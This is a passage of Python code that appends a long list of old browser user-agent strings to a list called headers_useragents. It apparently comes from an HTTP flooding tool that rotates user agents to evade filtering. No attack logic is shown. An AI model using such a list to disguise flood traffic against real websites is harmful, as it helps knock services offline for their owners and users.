	 	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9b4pre) Gecko/2008022304 Minefield/3.0b4pre')
	 	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9b5) Gecko/2008042623 Iceweasel/3.0b5 (Debian-3.0~b5-3)')
	 	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9b5) Gecko/2008050509 Firefox/3.0b5')
	 	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9pre) Gecko/2008032621 Fedora/3.0-0.49.cvs20080326.fc9 Minefield/3.0pre')
	 	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9pre) Gecko/2008040318 Firefox/3.0pre (Swiftfox)')
	 	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9pre) Gecko/2008051917 Firefox/3.0pre Flock/2.0a1pre')
	 	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9pre) Gecko/2008061501 SeaMonkey/2.0a1pre')
	 	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9pre) Gecko/2008061504 Minefield/3.0pre')
	 	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; en-US; rv:2.0a1pre) Gecko/2008060602 Minefield/4.0a1pre')
	 	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; en-ZW; rv:1.8.0.7) Gecko/20061018 Firefox/1.5.0.7')
	 	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; en-gb) AppleWebKit/525.1+ (KHTML, like Gecko, Safari/525.1+) epiphany-webkit')
	 	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; en-us; rv:1.9.0.2) Gecko/2008092313 Ubuntu/9.04 (jaunty) Firefox/3.5')
	 	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; en; rv:1.8.0.7) Gecko/20060928 Epiphany/2.14 (Ubuntu)')
	 	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; en; rv:1.8.1.1) Gecko/20070117 Epiphany/2.16 BonEcho/2.0.0.1')
	 	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; en; rv:1.8.1.10) Gecko/20071213 Epiphany/2.20 Firefox/2.0.0.10')
	 	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; en; rv:1.8.1.11) Gecko/20071216 Firefox/2.0.0.11')
	 	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; en; rv:1.8.1.12) Gecko/20080208 (Debian-1.8.1.12-2) Epiphany/2.20')
	 	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; en; rv:1.8.1.12) Gecko/20080208 (Debian-1.8.1.12-5) Epiphany/2.20')
	 	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; en; rv:1.8.1.14) Gecko/20080416 Fedora/2.18.3-9.fc7 Epiphany/2.18 Firefox/2.0.0.14')
	 	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; en; rv:1.8.1.14) Gecko/20080418 Epiphany/2.20 Firefox/2.0.0.14')
	 	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; en; rv:1.8.1.17) Gecko/20080927 Epiphany/2.20 Firefox/2.0.0.17 (Dropline GNOME)')
	 	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; en; rv:1.8.1.19) Gecko/20081216 Epiphany/2.20 Firefox/2.0.0.19')
	 	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; en; rv:1.8.1.2) Gecko/20070220 Firefox/2.0.0.2')
	 	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; en; rv:1.8.1.3) Gecko/20061201 Epiphany/2.18 Firefox/2.0.0.3 (Ubuntu-feisty)')
	 	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; en; rv:1.8.1.3) Gecko/20070322 Epiphany/2.18')
	 	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; en; rv:1.8.1.3) Gecko/20070403 Epiphany/2.16 Firefox/2.0.0.3')
	 	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; en; rv:1.8.1.4) Gecko/20070508 (Debian-1.8.1.4-1) Epiphany/2.18')
	 	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; en; rv:1.8.1.5) Gecko/20070712 (Debian-1.8.1.5-1) Epiphany/2.18')
	 	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; en; rv:1.9) Gecko/20080528 (Gentoo) Epiphany/2.22 Firefox/3.0')
	 	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; en; rv:1.9) Gecko/2008062113 Iceweasel/3.0')
	 	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; en; rv:1.9.0.12) Gecko/20080528 Epiphany/2.22 Firefox/3.0')
	 	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; en; rv:1.9.0.14) Gecko/20080528 Epiphany/2.22 (Debian/2.26.3-2)')
	 	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; en; rv:1.9.0.15) Gecko/20080528 Epiphany/2.22 Firefox/3.0')
	 	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; en; rv:1.9.0.4) Gecko/20080528 Epiphany/2.22 Firefox/3.0')
	 	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; en; rv:1.9.0.5) Gecko/20080528 Fedora/2.24.1-3.fc10 Epiphany/2.22 Firefox/3.0')
	 	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; en; rv:1.9.0.6) Gecko/20080528')
	 	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; en; rv:1.9.0.6) Gecko/2009020911 Ubuntu/8.10 (intrepid) Firefox/3.0.6')
	 	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; en; rv:1.9.0.7) Gecko/20080528 Epiphany/2.22')
	 	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; en; rv:1.9.0.8) Gecko/20080528 Epiphany/2.22 (Debian/2.24.3-2)')
	 	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; en; rv:1.9.0.8) Gecko/20080528 Epiphany/2.22 Firefox/3.0')
	 	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; en; rv:1.9.0.9) Gecko/20080528 Epiphany/2.22 Firefox/3.0')
	 	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; en; rv:1.9a4) Gecko/20070427 GranParadiso/3.0a4')
	 	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; en; rv:1.9b3) Gecko Epiphany/2.20')
	 	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; en_GB; rv:1.9.0.1) Gecko/20080528 Epiphany/2.22 Firefox/3.0')
	 	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; en_US; rv:1.8.1b1) Gecko/20060813 Firefox/2.0b1')
	 	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; es-AR; rv:1.2.1) Gecko/20021130')
	 	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; es-AR; rv:1.8.0.4) Gecko/20060608 Ubuntu/dapper-security Firefox/1.5.0.4')
	 	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; es-AR; rv:1.8.0.7) Gecko/20060909 Firefox/1.5.0.7')
	 	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; es-AR; rv:1.8.1.11) Gecko/20071204 Ubuntu/7.10 (gutsy) Firefox/2.0.0.11')
	 	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; es-AR; rv:1.8.1.12) Gecko/20080207 Ubuntu/7.10 (gutsy) Firefox/2.0.0.12')
	 	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; es-AR; rv:1.8.1.14) Gecko/20080404 Firefox/2.0.0.14')
	 	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; es-AR; rv:1.8.1.3) Gecko/20070310 Iceweasel/2.0.0.3 (Debian-2.0.0.3-1)')
	 	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; es-AR; rv:1.8.1.4) Gecko/20070508 Iceweasel/2.0.0.4 (Debian-2.0.0.4-0etch1)')
	 	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; es-AR; rv:1.8.1.6) Gecko/20070723 Iceweasel/2.0.0.6 (Debian-2.0.0.6-0etch1+lenny1)')
	 	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; es-AR; rv:1.8.1.6) Gecko/20070803 Firefox/2.0.0.6 (Swiftfox)')
	 	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; es-AR; rv:1.8.1.6) Gecko/20070914 Firefox/2.0.0.7')
	 	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; es-AR; rv:1.9.0.4) Gecko/2008111317 Linux Mint/5 (Elyssa) Firefox/3.0.4')
	 	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; es-AR; rv:1.9.0.4) Gecko/2008111317 Ubuntu/8.04 (hardy) Firefox/3.0.4')
	 	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; es-AR; rv:1.9.0.7) Gecko/2009032803 Iceweasel/3.0.6 (Debian-3.0.6-1)')
	 	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; es-AR; rv:1.9.0.9) Gecko/2009042113 Ubuntu/9.04 (jaunty) Firefox/3.0.9')
	 	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; es-AR; rv:1.9.1.8) Gecko/20100214 Ubuntu/9.10 (karmic) Firefox/3.5.8')
	 	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; es-AR; rv:1.9.2.10) Gecko/20100922 Ubuntu/10.10 (maverick) Firefox/3.6.10')
	 	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; es-AR; rv:1.9b5) Gecko/2008041514 Firefox/3.0b5')
	 	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; es-ES; rv:1.7.12) Gecko/20050929')
	 	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; es-ES; rv:1.8.0.1) Gecko/20060124 Firefox/1.5.0.1')
	 	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; es-ES; rv:1.8.0.11) Gecko/20070327 Ubuntu/dapper-security Firefox/1.5.0.11')
	 	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; es-ES; rv:1.8.0.4) Gecko/20060608 Ubuntu/dapper-security Firefox/1.5.0.4')
	 	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; es-ES; rv:1.8.0.7) Gecko/20060830 Firefox/1.5.0.7 (Debian-1.5.dfsg+1.5.0.7-1~bpo.1)')
	 	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; es-ES; rv:1.8.1.12) Gecko/20080213 Firefox/2.0.0.12')
	 	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; es-ES; rv:1.8.1.13) Gecko/20080311 Iceweasel/2.0.0.13 (Debian-2.0.0.13-0etch1)')
	 	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; es-ES; rv:1.8.1.14) Gecko/20080404 Iceweasel/2.0.0.14 (Debian-2.0.0.14-0etch1)')
	 	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; es-ES; rv:1.8.1.14) Gecko/20080404 Iceweasel/2.0.0.14 (Debian-2.0.0.14-2)')
	 	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; es-ES; rv:1.8.1.14) Gecko/20080419 Ubuntu/8.04 (hardy) Firefox/2.0.0.14')
	 	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; es-ES; rv:1.8.1.18) Gecko/20081030 Iceweasel/2.0.0.18 (Debian-2.0.0.18-0etch1)')
	 	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; es-ES; rv:1.8.1.2) Gecko/20060601 Firefox/2.0.0.2 (Ubuntu-edgy)')
	 	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; es-ES; rv:1.8.1.2) Gecko/20070220 Firefox/2.0.0.2')
	 	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; es-ES; rv:1.8.1.2) Gecko/20070225 Firefox/2.0.0.2 (Swiftfox)')
	 	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; es-ES; rv:1.8.1.4) Gecko/20061201 Firefox/2.0.0.4 (Ubuntu-feisty)')
	 	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; es-ES; rv:1.8.1.5) Gecko/20070718 Fedora/2.0.0.5-1.fc7 Firefox/2.0.0.5')
	 	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; es-ES; rv:1.8.1.9) Gecko/20071025 Iceweasel/2.0.0.9')
	 	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; es-ES; rv:1.8.1.9) Gecko/20071025 Iceweasel/2.0.0.9 (Debian-2.0.0.9-2)')
	 	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; es-ES; rv:1.9.0.10) Gecko/2009042513 Linux Mint/5 (Elyssa) Firefox/3.0.10')
	 	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; es-ES; rv:1.9.0.10) Gecko/2009042523 Ubuntu/9.04 (jaunty) Firefox/3.0.10')
	 	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; es-ES; rv:1.9.0.11) Gecko/2009060309 Linux Mint/5 (Elyssa) Firefox/3.0.11')
	 	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; es-ES; rv:1.9.0.11) Gecko/2009060310 Ubuntu/8.10 (intrepid) Firefox/3.0.11')
	 	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; es-ES; rv:1.9.0.11) Gecko/2009061118 Fedora/3.0.11-1.fc9 Firefox/3.0.11')
	 	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; es-ES; rv:1.9.0.11) Gecko/2009061212 Iceweasel/3.0.6 (Debian-3.0.6-1)')
	 	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; es-ES; rv:1.9.0.11) Gecko/2009061319 Iceweasel/3.0.11 (Debian-3.0.11-1)')
		headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; es-ES; rv:1.9.0.14) Gecko/2009090216 Firefox/3.0.14')
	 	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; es-ES; rv:1.9.1.16) Gecko/20111108 Iceweasel/3.5.16 (like Firefox/3.5.16)')
	 	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; es-ES; rv:1.9.1.6) Gecko/20091201 SUSE/3.5.6-1.1.1 Firefox/3.5.6 GTB6')
	 	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; es-ES; rv:1.9.1.7) Gecko/20091222 SUSE/3.5.7-1.1.1 Firefox/3.5.7')
	 	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; es-ES; rv:1.9.1.9) Gecko/20100317 SUSE/3.5.9-0.1 Firefox/3.5.9')
	 	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; es-ES; rv:1.9.2.13) Gecko/20101206 Ubuntu/9.10 (karmic) Firefox/3.6.13')
	 	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; es-ES; rv:1.9.2.17pre) Gecko/20110404 Ubuntu/10.10 (Maverick) Namoroka/3.6.17pre')
	 	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; eu; rv:1.9.0.6) Gecko/2009012700 SUSE/3.0.6-0.1.2 Firefox/3.0.6')
	 	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; fa; rv:1.8.1.4) Gecko/20100527 Firefox/3.6.4')
	 	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; fi-FI; rv:1.9.0.11) Gecko/2009060308 Ubuntu/9.04 (jaunty) Firefox/3.0.11')
	 	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; fi-FI; rv:1.9.0.13) Gecko/2009080315 Linux Mint/6 (Felicia) Firefox/3.0.13')
	 	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; fi-FI; rv:1.9.0.5) Gecko/2008121622 Ubuntu/8.10 (intrepid) Firefox/3.0.5')
	 	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; fi-FI; rv:1.9.0.9) Gecko/2009042113 Ubuntu/9.04 (jaunty) Firefox/3.0.9')
	 	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; fi-FI; rv:1.9.2.8) Gecko/20100723 Ubuntu/10.04 (lucid) Firefox/3.6.8')
	 	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; fr-FR; rv:0.9.4) Gecko/20011126 Netscape6/6.2.1')
	 	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.0; it; rv:1.9.1b2) Gecko/20081201 Firefox/3.1b2')
	 	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.0; it; rv:1.9.2.12) Gecko/20101114 IceCat/3.6.12 (like Firefox/3.6.12)')
	 	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.0; ja-JP) AppleWebKit/528+ (KHTML, like Gecko, Safari/528.0) Lunascape/5.0.3.0')
	 	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.0; ja-JP) AppleWebKit/528+ (KHTML, like Gecko, Safari/528.0) Lunascape/5.1.1.0')
	 	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.0; ja-JP) AppleWebKit/528+ (KHTML, like Gecko, Safari/528.0) Lunascape/5.1.2.0')
	 	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.0; ja-JP) AppleWebKit/528.16 (KHTML, like Gecko) Version/4.0 Safari/528.16')
	 	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.0; ja-JP) AppleWebKit/530.19.2 (KHTML, like Gecko) Version/4.0.2 Safari/530.19.1')
	 	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.0; ja-JP) AppleWebKit/533.16 (KHTML, like Gecko) Version/5.0 Safari/533.16')
	 	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.0; ja-JP) AppleWebKit/533.20.25 (KHTML, like Gecko) Version/5.0.4 Safari/533.20.27')
	 	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.0; ja; rv:1.8.1.16) Gecko/20080702 Firefox/2.0.0.16')
	 	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.0; ja; rv:1.8.1.20) Gecko/20081217 Firefox/2.0.0.20 (.NET CLR 3.5.30729)')
	 	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.0; ja; rv:1.9.1.1) Gecko/20090715 Firefox/3.5.1')
	 	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.0; ja; rv:1.9.1.15) Gecko/20101029 Firefox/3.5.15 Lunascape/6.3.4.23051 ( .NET CLR 3.5.30729)')
	 	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.0; ja; rv:1.9.1.7) Gecko/20091221 Firefox/3.5.7 GTB6')
	 	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.0; ja; rv:1.9.2.12) Gecko/20101029 Firefox/3.6.12 Lunascape/6.3.4.23051 ( .NET CLR 3.5.30729; .NET4.0C)')
	 	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.0; ja; rv:1.9.2.4) Gecko/20100513 Firefox/3.6.4 ( .NET CLR 3.5.30729)')
	 	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.0; ja; rv:1.9.3a5pre) Gecko/20100605 Minefield/3.7a5pre ( .NET CLR 3.5.30729)')
	 	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.0; ko; rv:1.8.1.20) Gecko/20081217 Firefox/2.0.0.20 (.NET CLR 3.5.30729)')
	 	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.0; ko; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
	 	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.0; nb-NO) AppleWebKit/533.18.1 (KHTML, like Gecko) Version/5.0.2 Safari/533.18.5')
	 	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.0; nl) AppleWebKit/522.11.3 (KHTML, like Gecko) Version/3.0 Safari/522.11.3')
	 	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.0; nl) AppleWebKit/522.13.1 (KHTML, like Gecko) Version/3.0.2 Safari/522.13.1')
	 	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.0; nl; rv:1.9.0.12) Gecko/2009070611 Firefox/3.0.12 (.NET CLR 3.5.30729)')
	 	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.0; nl; rv:1.9.1.9) Gecko/20100315 Firefox/3.5.9 ( .NET CLR 3.5.30729)')
	 	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.0; nl; rv:1.9.2.6) Gecko/20100625 Firefox/3.6.6')
	 	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.0; pl-PL) AppleWebKit/525.19 (KHTML, like Gecko) Version/3.1.2 Safari/525.21')
	 	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.0; pl-PL) AppleWebKit/530.19.2 (KHTML, like Gecko) Version/4.0.2 Safari/530.19.1')
	 	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.0; pl; rv:1.8.1.14) Gecko/20080519 Firefox/2.0.0.14 Flock/1.2.1')
	 	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.0; pl; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17')
	 	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.0; pl; rv:1.9.1.2) Gecko/20090729 Firefox/3.5.2 GTB7.1 ( .NET CLR 3.5.30729)')
	 	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.0; pl; rv:1.9.2.16) Gecko/20110319 Firefox/3.6.16')
	 	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.0; pl; rv:1.9b4) Gecko/2008030714 Firefox/3.0b4')
	 	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.0; pt-BR; rv:1.9.2.18) Gecko/20110614 Firefox/3.6.18 (.NET CLR 3.5.30729)')
	 	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.0; ru-RU) AppleWebKit/528.16 (KHTML, like Gecko) Version/4.0 Safari/528.16')
	 	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.8.1.12) Gecko/20080201 Firefox/2.0.0.12; MEGAUPLOAD 2.0')
	 	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.8.1.20) Gecko/20081217 Firefox/2.0.0.20')
	 	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.0.12) Gecko/2009070611 Firefox/3.0.12 (.NET CLR 3.5.30729)')
	 	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.1.5) Gecko/20091102 MRA 5.5 (build 02842) Firefox/3.5.5')
	 	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.1b4pre) Gecko/20090419 SeaMonkey/2.0b1pre')
	 	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.2) Gecko/20100115 Firefox/3.6')
	 	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.0; rv:1.9.1b4pre) Gecko/20090419 SeaMonkey/2.0b1pre')
	 	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.0; sr; rv:1.9.0.12) Gecko/2009070611 Firefox/3.0.12')
	 	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.0; sv-SE) AppleWebKit/523.13 (KHTML, like Gecko) Version/3.0 Safari/523.13')
	 	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.0; sv-SE) AppleWebKit/525.27.1 (KHTML, like Gecko) Version/3.2.1 Safari/525.27.1')
	 	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.0; sv-SE; rv:1.8.1.15) Gecko/20080623 Firefox/2.0.0.15')
	 	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.0; sv-SE; rv:1.9.0.18) Gecko/2010020220 Firefox/3.0.18 (.NET CLR 3.5.30729)')
	 	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.0; sv-SE; rv:1.9.1.1) Gecko/20090715 Firefox/3.5.1 (.NET CLR 3.5.30729)')
	 	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.0; sv-SE; rv:1.9.1b2) Gecko/20081201 Firefox/3.1b2')
	 	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.0; sv-SE; rv:1.9.2.12) Gecko/20101026 Firefox/3.6.12')
	 	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.0; tr-TR) AppleWebKit/533.18.1 (KHTML, like Gecko) Version/5.0.2 Safari/533.18.5')
	 	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.0; tr; rv:1.8.1.9) Gecko/20071025 Firefox/2.0.0.9')
	 	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.0; tr; rv:1.9.1.1) Gecko/20090715 Firefox/3.5.1 (.NET CLR 3.5.30729)')
	 	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.0; x64; en-US; rv:1.9.1b2pre) Gecko/20081026 Firefox/3.1b2pre')
	 	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.0; zh-CN; rv:1.8.1.20) Gecko/20081217 Firefox/2.0.0.19')
	 	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.0; zh-CN; rv:1.9.0.19) Gecko/2010031422 Firefox/3.0.19 ( .NET CLR 3.5.30729)')
	 	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.0; zh-CN; rv:1.9.2.4) Gecko/20100513 Firefox/3.6.4')
	 	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.0; zh-CN; rv:1.9.2.6) Gecko/20100625 Firefox/3.6.6 GTB7.1')
	 	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.0; zh-TW) AppleWebKit/530.19.2 (KHTML, like Gecko) Version/4.0.2 Safari/530.19.1')
	 	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.0; zh-TW; rv:1.8.1.20) Gecko/20081217 Firefox/2.0.0.20')
	 	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.0; zh-TW; rv:1.8.1.5) Gecko/20070713 Firefox/2.0.0.5')
	 	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.0; zh-TW; rv:1.9.1) Gecko/20090624 Firefox/3.5 (.NET CLR 3.5.30729)')
	 	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; WOW64; cs; rv:1.9.2.6) Gecko/20100723 myibrow/4.0.0.0 (Firefox/3.6 compatible)')
		headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; WOW64; en-US; rv:2.0.4) Gecko/20120718 AskTbAVR-IDW/3.12.5.17700 Firefox/14.0.1')
		headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; ar; rv:1.9.2) Gecko/20100115 Firefox/3.6')
		headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; ar; rv:1.9.2.18) Gecko/20110614 Firefox/3.6.18')
		headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; ca; rv:1.9.2.3) Gecko/20100401 Firefox/3.6.3 (.NET CLR 3.5.30729)')
		headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; cs-CZ) AppleWebKit/533.20.25 (KHTML, like Gecko) Version/5.0.4 Safari/533.20.27')
		headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; cs; rv:1.9.2.3) Gecko/20100401 Firefox/3.6.3 ( .NET CLR 3.5.30729)')
		headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; cs; rv:1.9.2.4) Gecko/20100513 Firefox/3.6.4 (.NET CLR 3.5.30729)')
		headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; cs; rv:1.9.2.6) Gecko/20100628 myibrow/4alpha2')
		headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; cs; rv:1.9.2a2pre) Gecko/20090912 Namoroka/3.6a2pre (.NET CLR 3.5.30729)')
		headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; de-AT; rv:1.9.1b2) Gecko/20081201 Firefox/3.1b2')
		headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; de-DE) AppleWebKit/525.28 (KHTML, like Gecko) Version/3.2.2 Safari/525.28.1')
		headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; de-DE) AppleWebKit/533.20.25 (KHTML, like Gecko) Version/5.0.3 Safari/533.19.4')
		headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; de-DE) AppleWebKit/534.10 (KHTML, like Gecko) Chrome/7.0.540.0 Safari/534.10')
		headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; de-DE) AppleWebKit/534.10 (KHTML, like Gecko) Chrome/8.0.552.224 Safari/534.10')
